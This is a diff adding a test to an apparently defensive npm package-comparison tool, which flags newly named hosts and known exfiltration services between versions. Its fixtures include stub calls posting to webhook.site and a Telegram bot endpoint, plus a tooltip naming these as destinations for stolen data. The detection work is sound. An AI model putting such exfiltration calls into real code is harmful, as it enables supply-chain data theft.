@@ -770,6 +770,44 @@ test('Compare flags in red code that runs beyond itself new to a file the open v
   assert.match(await badges(rooted, unrooted), /npm-compare-runs[^]*?compare-tip-path">package\/lib\/a\.js<[^]*?<span>Runs code<\/span><span class="npm-extension-count">eval<\/span>/u)
 })
 
+test('Compare flags the hosts the open version\'s code names that the one compared with named in none of its, and in red an exfiltration host new to a file', async () => {
+  const version = (ver, files) => ({ integrity: `hosts@${ver}`, kind: 'sourcemap', json: { version: 3, sources: Object.keys(files), sourcesContent: Object.values(files) },
+    npm: { name: 'hosts', version: ver } })
+  const badges = async (base, other) => {
+    const files = computeBundleDiff(bundleFilesAsMap(base), bundleFilesAsMap(other), () => '__own__').files
+    npmCompareBadges(base, other, files); await new Promise(resolve => { setImmediate(resolve) }); return rendered(npmCompareBadges(base, other, files))
+  }
+  const base = version('1.0.0', { 'lib/api.js': 'fetch("https://api.stripe.com/v1")\n', 'lib/old.js': 'get("https://cdn.jsdelivr.net/x")\n', 'README.md': 'See https://docs.new.dev\n',
+    'lib/geo.js': 'get("https://ipinfo.io/json")\n' })
+  const other = version('1.1.0', { 'lib/api.js': 'fetch("https://api.stripe.com/v1")\npost("https://webhook.site/0c9a")\n// https://commented.example.net\n',
+    'lib/old.js': 'get("https://cdn.jsdelivr.net/x")\nget("https://docs.new.dev/errors")\n', 'lib/new.js': 'get("https://cdn.jsdelivr.net/y")\nbot("https://api.telegram.org/bot")\n',
+    'README.md': 'See https://docs.new.dev\n', 'lib/geo.js': 'get("https://ipinfo.io/json?x")\n' })
+  const flagged = await badges(base, other)
+  assert.match(flagged, /<li><span class=npm-extension is-warn npm-compare-hosts[^]*?<span>New hosts<\/span><span class="npm-extension-count">3<\/span><\/span><\/li>/u,
+    'in orange, how many')
+  const hostRows = /compare-tip-head">New hosts<\/div>\s*<div class="compare-tip-rows is-files">([^]*?)<\/div>/u.exec(flagged)[1]
+  assert.deepEqual([...hostRows.matchAll(/compare-tip-path">([^<]+)<\/span><span class="compare-tip-said">([^<]+)</gu)].map(([, name, at]) => `${name}: ${at}`),
+    ['api.telegram.org: lib/new.js, line 2', 'webhook.site: lib/api.js, line 2', 'docs.new.dev: lib/old.js, line 2'],
+    'each with where it is first named; not one the version compared with\'s code named, in another file too, nor one in a comment, nor its readme\'s')
+  assert.match(flagged, /<li><span class=npm-extension npm-compare-file npm-compare-exfiltration[^]*?<span>Exfiltration<\/span><span class="npm-extension-count">webhook\.site, Telegram<\/span><\/span><\/li>/u,
+    'in red, the services named; not ipinfo, which lib/geo.js named already')
+  assert.match(flagged, /compare-tip-path">lib\/new\.js<\/span><span class="compare-tip-said">Telegram \(line 2\)</u)
+  assert.doesNotMatch(await badges(other, base), /npm-compare-hosts|npm-compare-exfiltration/u, 'none the other way: hosts dropped, and a readme\'s no code')
+  const files = Object.fromEntries(base.json.sources.map((path, i) => [path, base.json.sourcesContent[i]]))
+  const one = await badges(base, version('1.0.1', { ...files, 'lib/api.js': `${files['lib/api.js']}get("https://one.new.dev")\n` }))
+  assert.match(one, /<span>New host<\/span><span class="npm-extension-count">one\.new\.dev<\/span>/u, 'one, named')
+  assert.doesNotMatch(await badges(base, base), /npm-compare-hosts|npm-compare-exfiltration/u)
+  // Laid out under other roots, a file added at a path the one compared with
+  // held another file at names its services anew all the same.
+  const rooted = version('2.0.0', { 'package/lib/a.js': 'post("https://webhook.site/x")\n', 'package/index.js': 'module.exports = 1\n' })
+  const unrooted = version('2.1.0', { 'lib/a.js': 'post("https://webhook.site/x")\n', 'index.js': 'module.exports = 1\n', 'package/lib/a.js': 'post("https://webhook.site/y")\n' })
+  assert.match(await badges(rooted, unrooted), /npm-compare-exfiltration[^]*?compare-tip-path">package\/lib\/a\.js<[^]*?<span>Exfiltration<\/span>/u)
+  // Each file's tag where it names one, in orange as what it runs is.
+  const tags = path => [...rendered(npmCompareFiles.tag(other, path)).matchAll(/class="(npm-[\w-]+)" data-tooltip=([^>]*)>([^<]+)</gu)].map(([, kind, note, tag]) => `${kind}:${tag} ${note}`)
+  assert.deepEqual(tags('lib/api.js'), ['npm-exfiltration:Exfiltration Names a host malicious packages send what they take to: webhook.site (line 2)'])
+  assert.deepEqual(tags('lib/old.js'), [])
+})
+
 test('the Overview\'s provenance: what built the version, from which commit, then by which workflow, in which run, its log entry; none, or nothing for a private package', async () => {
   const entry = (name, manifest, extra = {}) => ({ npm: { name, version: '1.0.0', manifest, ...extra } })
   const fact = async version => { npmProvenanceFact(version); await new Promise(resolve => { setImmediate(resolve) }); return rendered(npmProvenanceFact(version)) }
